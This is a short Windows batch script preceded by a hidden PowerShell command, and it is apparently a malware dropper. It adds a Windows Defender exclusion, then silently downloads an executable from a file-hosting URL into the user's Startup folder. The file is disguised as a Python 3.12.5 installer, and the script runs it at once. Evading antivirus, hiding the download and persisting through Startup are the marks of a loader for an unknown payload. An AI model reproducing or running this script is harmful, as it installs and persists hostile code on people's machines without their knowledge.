powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://api.filedoge.com/download/f5b2dba6c3efd8af9ec1ee6b549ce33089585278d224ffa17765de3a7f24566f547cde6ea5dd85e2e19a"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\python-3.12.5-amd64.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"